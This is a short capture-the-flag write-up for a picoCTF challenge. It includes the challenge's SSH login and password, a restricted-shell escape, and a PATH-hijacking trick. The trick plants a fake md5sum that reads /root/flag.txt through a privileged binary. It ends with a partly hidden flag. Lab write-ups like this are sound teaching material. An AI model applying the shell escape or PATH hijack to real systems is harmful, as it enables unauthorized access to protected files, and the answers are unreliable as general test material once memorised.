# Description

Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. 
If only it could just give you the actual content!
Connect using ssh ctf-player@rescued-float.picoctf.net -p 49568 with the password, f3b61b38 and run the binary named "flaghasher".

# Solution

This challenge is very similar to `hash-only-1` with the difference that `flaghasher` is not in the home directory so you can use the find command to find the location: `find / -type f -iname "flaghasher"`

That will show you the location to be: `/usr/local/bin/flaghasher`

If you try to do `cd /usr/local/bin/` see `-rbash: /dev/null: restricted: cannot redirect output` so you can just run `bash` and rerun the command to get to the directory.

Then from here, it's the same thing as the last challenge: `echo "/bin/cat /root/flag.txt" > md5sum`, then `chmod +x md5sum`, then `export PATH=.:$PATH`. After that, you can run `./flaghasher` to get the flag. You can use the `exit` command to leave the terminal.

Flag: `picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_fc06...}`